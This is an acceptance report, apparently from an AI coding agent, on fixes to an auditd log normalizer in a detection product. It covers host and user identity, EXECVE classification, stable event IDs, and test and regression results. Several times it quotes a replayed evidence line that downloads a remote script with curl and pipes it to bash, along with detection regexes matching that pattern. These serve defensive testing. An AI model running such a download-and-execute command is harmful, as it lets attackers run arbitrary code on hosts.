# D2 / D3 / D10 — AUDITD CORRECTNESS · ACCEPTANCE REPORT

Date: 2026-09-14 · **Preview only. NO PRODUCTION DEPLOYMENT.**
No 93-rule sweep. No PATH/CWD work. No UI. No security/control-plane code.

Reproduce:
```
cd /app/backend && python3 -m pytest tests/test_d2_d3_d10_auditd_correctness.py -q
cd /app && python3 scripts/p0_d4_stitching_live_proof.py
```

---

## A · Verified definitions (from the repository, not from the prompt)

Re-read from `memory/REAL_SECURITY_LOOP_STEP1_OWNER_ANSWER.md` §D and the
defect register in `memory/PRD.md`, then re-confirmed against the code:

| ID | Definition as recorded in the register |
|---|---|
| **D2** | The normalizer lost host **and** user identity: `host = {hostname: "", host_id: ""}` although the envelope carried `source="acceptance-host"`; `identity.username = "uid:"`, `is_privileged = False` |
| **D3** | `record_type=EXECVE` classified as `event_type="auditd_syscall"` instead of `process_execution`, because the branch required `syscall` or `exe` — neither of which an EXECVE record carries |
| **D10** | `event_id = uuid4()`, so replaying the identical line produced a different canonical id every time; no stable canonical identity |

**One correction to my own earlier framing:** D2 is *two* losses, host **and**
user identity. My D4 report described only the host half as "untouched",
because D4 had already fixed the user half for the *stitched* path. The
unstitched path still had the `uid:` lie until this change. Both halves are
now fixed on **both** paths.

## B · Files changed

| File | Change |
|---|---|
| `detection_content/telemetry/linux_auditd_dsm.py` | D2 host precedence + placeholder rejection; D2 identity honesty on both paths; D3 EXECVE classification; D10 deterministic id on both paths; provenance fields; removed the now-unused `uuid` import |
| `tests/test_d2_d3_d10_auditd_correctness.py` | **NEW** — 22 tests covering all 12 owner cases |

That is the whole change. One product file.

## C · Host identity source and precedence

Declared, strongest first:

1. `auditd:host` — an explicit `host=`/`hostname=` field in the record
2. `auditd:node` — auditd's own host naming (`name_format=hostname`); the
   endpoint naming itself
3. `collector:envelope.source` — the collector's label for the **origin** of
   the record. **Explicit semantic justification:** for a syslog collector
   the envelope `source` *is* the sending host, not the collector's own
   identity. It is recorded under a distinct source name so an analyst can
   see it is the transport's view of the origin rather than the endpoint's
   own claim.
4. otherwise → not observed

Every value carries `host_identity_source` and `host_identity_state`.

**Refused outright** (treated as no evidence, per your instruction):
`localhost`, `localhost.localdomain`, `127.0.0.1`, `::1`, `unknown`,
`default`, `-`, `none`, `null`, whitespace. Case-insensitive. The tenant name
is never used — tested explicitly.

## D · Missing-host behaviour

```
host.hostname            = ""
host.host_id             = ""
host_identity_state      = NOT_OBSERVED
host_identity_source     = None
host_not_observed_reason = "no authoritative host name was available: the
   audit record carried no node/host field and the collector supplied no
   origin label; a placeholder would be a fabricated claim"
```

Identity behaves the same way: `username=""` (never `"uid:"`),
`identity_state=NOT_OBSERVED`, reason *"privilege is unknown, not
unprivileged"*.

## E · Stable event-ID algorithm and source

`event_id = "cev_auditd_" + sha256(material)[:24]`, with the material
declared in `event_id_basis` on every event:

| Path | Material | `event_id_basis` |
|---|---|---|
| stitched group | tenant │ collector │ audit `epoch:serial` | `tenant+collector+audit_identity` |
| single record | tenant │ collector │ audit identity │ **record type** | `tenant+collector+audit_identity+record_type` |
| no audit identity | tenant │ collector │ verbatim line | `tenant+collector+verbatim_line` |

Record type is in the material for single records so that a lone SYSCALL and
a lone EXECVE **of the same audit event** stay distinct — they are different
evidence and must not collapse into one security object. Proven by test.

No `uuid4()` remains in the auditd path; the import is gone. Identity is
never derived from a display field (`proctitle`, `comm`) when a stronger
source identity exists.

## F · Tenant / collector collision protection

Tenant and collector are in the hash material on **every** branch, including
the no-audit-id fallback. Proven by four tests:

- two tenants, identical audit ids → different `event_id` (stitched **and**
  unstitched)
- two collectors, same serial → different `event_id` (both paths)
- different audit events → never share an identity
- a changed verbatim line → never reuses the fallback identity

## G · Stitched-path results

Live, through real HTTP ingest (preview):

```
event_id       cev_auditd_b30b38dd1b177c9320c2f864
event_id_basis tenant+collector+audit_identity
event_type     process_execution
host           d4-proof-host   ← collector:envelope.source   OBSERVED
identity       root  privileged=True                          OBSERVED
command_line   /bin/bash -c curl -s http://198.51.100.9/x.sh | bash
completeness   COMPLETE   records=['EXECVE','PROCTITLE','SYSCALL']
evidence_refs  3 raw records, verbatim
```

**D2 is now visibly closed on the live path** — the host that was empty in the
Step-0 audit now resolves, with its provenance recorded.

## H · Unstitched-path results

The gate you flagged as critical — the fallback must not become a second,
lower-quality truth. A lone EXECVE now yields:

| Property | Before | After |
|---|---|---|
| `event_type` | `auditd_syscall` | **`process_execution`** |
| `host.hostname` | `""` (source ignored) | **resolved**, or `NOT_OBSERVED` with a reason |
| `identity.username` | `"uid:"` | **`""` + `NOT_OBSERVED`** |
| `is_privileged` | `False` (asserted) | `False` but declared **unknown** |
| `event_id` | `uuid4()` — new every replay | **deterministic** |

Both paths now emit the same provenance keys — `host_identity_source`,
`host_identity_state`, `identity_state`, `event_id_basis` — so a consumer
cannot tell them apart by quality, only by completeness.

## I · D8 compatibility

Re-proven live and in tests: raw records → stitching/fallback → canonical
event → rule evaluation → citation → `evidence_ref` → original raw record.

```
DET-EX-006 v1 · CITED
[MATCH] process.command_line matches \b(curl|wget)\b
        observed = '/bin/bash -c curl -s http://198.51.100.9/x.sh | bash'
[MATCH] process.command_line matches \|\s*(bash|sh|python|perl)\b
```

`NO_MATCH` remains evidence-derived: a benign `curl -O …tar.gz` with no pipe
to a shell does **not** match — tested.

## J · Evidence examples, labelled

- **REPLAYED REAL EVIDENCE** — the EXECVE line
  `type=EXECVE msg=audit(…): argc=3 a0="/bin/bash" a1="-c" a2="curl -s
  http://198.51.100.9/x.sh | bash"` is the verbatim line already in stored
  canonical evidence from the earlier acceptance run.
- **TEST/SYNTHETIC** — the SYSCALL / PROCTITLE / `node=` companions, which
  are the records auditd genuinely emits alongside it.
- **REAL SENSOR** — untouched by this change and still flowing
  independently (NivXForge Linux sensor).

Neither the replayed nor the synthetic evidence is live telemetry, and
nothing was sent to production. Live HTTP runs used tenant `t-d4-proof` on
preview.

## K · Tests and exact results

```
tests/test_d2_d3_d10_auditd_correctness.py .......... 22 passed
scripts/p0_d4_stitching_live_proof.py ............... 24/24 checks PASS
```

All 12 owner cases covered: stitched with/without hostname (1,2), unstitched
with/without hostname (3,4), two tenants same audit id (5), two collectors
same serial (6), duplicate raw records (7), replay (8), malformed host
identity — 10 placeholder values (9), D8 citation after the changes (10),
raw drill-down (11), D4 regression (12). Plus: real `node` beats a
placeholder source; tenant name never used as hostname; distinct records of
one audit event never collapse; no-audit-id fallback still deterministic.

## L · Regressions

```
D2/D3/D10 + D4 + D8 + telemetry + pipeline + detection + rule binding
  → 88 passed, 4 failed
```

The 4 are `test_xdr_detection_consolidation` — **already proven pre-existing
against a clean tree in the D4 report** (4 failed clean, 4 failed patched,
identical). D4's 22 tests and D8's 18 all still pass unchanged.

## M · Performance / storage impact

| | Value |
|---|---|
| Stitched event before this change | 7,878 B |
| Stitched event after | **8,084 B** (+206 B, **+2.6%**) |

The increase is the four new provenance fields plus the not-observed reasons.
Performance: string comparisons and one extra sha256 per event — not
measurable against the ~100 ms ingest→parsed stage. The sha256 **replaces**
`uuid4()`, so the id path itself is no more expensive.

## N · Remaining auditd limitations

1. **No connected real auditd host.** Production acceptance still requires
   one. Everything here is replayed/synthetic evidence on preview.
2. **PATH and CWD** are preserved and attributed but still not mapped into
   canonical `file.*` / working-directory fields (deferred, per your
   instruction).
3. **Cross-batch groups remain two honest partials** (D4 design).
4. `collector:envelope.source` is only as trustworthy as the collector's
   label. It is correct for syslog, but a relaying collector could present
   its own name — the provenance field makes that visible rather than
   solving it. A future `node`-based enrolment would be stronger.
5. **The XDR-ingest path still has no D1 provenance timestamps** — that is
   the next gate (ingest-path provenance).
6. `host_id` is set equal to `hostname`. There is no separate stable
   machine id in auditd telemetry, so this is a naming convenience, not a
   second independent identifier.

## O · D2 verdict: **PASS** (preview)

Host identity resolves from declared authoritative sources with provenance,
placeholders are refused, absence is explicit — and the user-identity half is
fixed on both paths. Live-proven.

## P · D3 verdict: **PASS** (preview)

`EXECVE` → `process_execution` on both the stitched and unstitched paths.

## Q · D10 verdict: **PASS** (preview)

Deterministic, collision-safe identity on every branch including the
no-audit-id fallback. Replay idempotent; distinct evidence never collapses;
tenant and collector boundaries respected. No `uuid4()` remains.

**None of the three is production-accepted** — that requires a real auditd
host (limitation 1).

---

## Recommended next (your stated order)

**Ingest-path provenance** — extend the D1 honest timestamps
(`collector_received_at` stamped for real at the collector boundary here,
plus `parsed_at`/`normalized_at`/`rule_evaluated_at`/`verdict_at`) to
collector-delivered sources, so auditd arrives already traceable. Then
PATH/CWD mapping, then small rule-declaration batches, then real auditd-host
acceptance.

---

## STOP — awaiting owner review.
